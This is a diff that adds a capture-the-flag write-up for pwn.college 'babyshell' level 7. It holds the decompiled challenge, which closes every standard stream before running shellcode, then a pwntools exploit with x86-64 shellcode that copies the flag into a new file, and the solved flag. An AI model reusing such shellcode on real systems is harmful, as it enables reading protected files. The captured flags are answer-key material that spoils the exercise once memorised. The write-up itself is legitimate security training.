@@ -1120,3 +1120,191 @@ if __name__ == "__main__":
 ### Flag
 
 Flag: `pwn.college{kfVRmOzEaLCMSxdS_zQkxZr6BEv.0lMyIDL5cTNxgzW}`
+
+## Level 7
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Write and execute shellcode to read the flag, but all file descriptors (including stdin, stderr and stdout!) are closed.
+
+### Write-up
+
+```c ins={48-49, 52-53, 57-58} del={39, 60} collapse={1-35, 43-44}
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  size_t v3; // rax
+  size_t v4; // rax
+  int fd; // [rsp+2Ch] [rbp-14h]
+  const char **i; // [rsp+30h] [rbp-10h]
+  const char **j; // [rsp+38h] [rbp-8h]
+
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts(
+    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
+  puts(
+    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
+  puts(
+    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
+  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
+  for ( fd = 3; fd <= 9999; ++fd )
+    close(fd);
+  for ( i = argv; *i; ++i )
+  {
+    v3 = strlen(*i);
+    memset((void *)*i, 0, v3);
+  }
+  for ( j = envp; *j; ++j )
+  {
+    v4 = strlen(*j);
+    memset((void *)*j, 0, v4);
+  }
+  shellcode = mmap((void *)0x2483B000, 0x4000uLL, 7, 34, 0, 0LL);
+  if ( shellcode != (void *)612610048 )
+    __assert_fail("shellcode == (void *)0x2483b000", "/challenge/babyshell-level-7.c", 0x62u, "main");
+  printf("Mapped 0x4000 bytes for shellcode at %p!\n", (const void *)0x2483B000);
+  puts("Reading 0x4000 bytes from stdin.\n");
+  shellcode_size = read(0, shellcode, 0x4000uLL);
+  if ( !shellcode_size )
+    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-7.c", 0x67u, "main");
+  puts("This challenge is about to execute the following shellcode:\n");
+  print_disassembly(shellcode, shellcode_size);
+  puts(byte_24A5);
+  puts(
+    "This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need");
+  puts("to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.\n");
+  if ( fclose(stdin) )
+    __assert_fail("fclose(stdin) == 0", "/challenge/babyshell-level-7.c", 0x6Fu, "main");
+  puts(
+    "This challenge is about to close stderr, which means that you will not be able to use file descriptor 2 for output.\n");
+  if ( fclose(stderr) )
+    __assert_fail("fclose(stderr) == 0", "/challenge/babyshell-level-7.c", 0x72u, "main");
+  puts(
+    "This challenge is about to close stdout, which means that you will not be able to use file descriptor 1 for output. You");
+  puts("will see no further output, and will need to figure out an alternate way of communicating data back to yourself.\n");
+  if ( fclose(stdout) )
+    __assert_fail("fclose(stdout) == 0", "/challenge/babyshell-level-7.c", 0x76u, "main");
+  puts("Executing shellcode!\n");
+  ((void (*)(void))shellcode)();
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+~开玩笑，没有输入输出错误流还能困得住我不成 LOL~
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, asm, context, gdb, log, pause, process, remote
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyshell-level-7"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload():
+    shellcode = asm(
+        """
+        mov rdi, 0x67616c662f
+        push rdi
+        lea rdi, [rsp]
+        xor rsi, rsi
+        xor rdx, rdx
+        mov rax, 0x2
+        syscall
+        push rax
+
+        mov rdi, 0x67616c662f2e
+        push rdi
+        lea rdi, [rsp]
+        mov rsi, 0x41
+        mov rdx, 0644
+        mov rax, 0x2
+        syscall
+
+        mov rdi, rax
+        mov rsi, [rsp+8]
+        xor rdx, rdx
+        mov r10, 0x1000
+        mov rax, 0x28
+        syscall
+
+        dec rdi
+        mov rax, 0x3c
+        syscall
+        """
+    )
+
+    return shellcode
+
+
+def attack(target, payload):
+    try:
+        send_payload(target, payload)
+
+        response = target.recvall(timeout=5)
+
+        return b"pwn.college{" in response
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch()
+        payload = construct_payload()
+
+        if attack(target, payload):
+            log.success("Success! Exiting...")
+
+            pause()
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{Y3UgyYnfUmoR24PWDDkCs1W8h92.01MyIDL5cTNxgzW}`
